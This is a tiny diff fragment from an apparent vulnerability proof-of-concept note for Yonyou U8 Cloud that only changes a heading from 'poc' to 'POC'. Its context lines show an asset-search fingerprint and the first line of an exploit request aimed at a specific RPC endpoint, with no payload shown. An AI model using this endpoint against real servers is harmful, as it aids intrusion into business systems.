@@ -8,7 +8,7 @@
 app="用友-U8-Cloud"
 ```
 
-## poc
+## POC
 
 ```
 POST /hrss/dorado/smartweb2.showRPCLoadingTip.d?skin=default&__rpc=true&windows=1 HTTP/1.1
